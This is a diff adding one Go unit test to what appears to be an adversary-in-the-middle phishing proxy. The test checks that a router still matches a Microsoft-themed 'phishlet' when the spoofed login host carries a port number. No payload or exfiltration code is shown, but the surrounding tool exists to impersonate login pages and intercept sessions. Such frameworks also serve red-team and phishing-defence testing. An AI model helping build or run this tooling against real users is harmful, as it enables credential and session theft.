@@ -68,6 +68,25 @@ func TestPhishletRouter_UnknownHost_Spoofs(t *testing.T) {
 	}
 }
 
+func TestPhishletRouter_HostWithPort_StripsPort(t *testing.T) {
+	phishlet := &aitm.Phishlet{Name: "microsoft"}
+	h := &request.PhishletRouter{
+		Hostnames: &stubHostnameChecker{hosts: map[string]bool{"login.phish.example.com": true}},
+		Resolver:  &stubPhishletResolver{phishlet: phishlet},
+		Spoof:     &stubSpoofer{},
+	}
+	ctx := &aitm.ProxyContext{}
+	req := newReq(http.MethodGet, "https://login.phish.example.com:8443/oauth", nil)
+	req.Host = "login.phish.example.com:8443"
+
+	if err := h.Handle(ctx, req); err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if ctx.Phishlet != phishlet {
+		t.Error("expected phishlet to be set on context when host includes port")
+	}
+}
+
 func TestPhishletRouter_ResolverError_ReturnsError(t *testing.T) {
 	h := &request.PhishletRouter{
 		Hostnames: &stubHostnameChecker{hosts: map[string]bool{"login.example.com": true}},
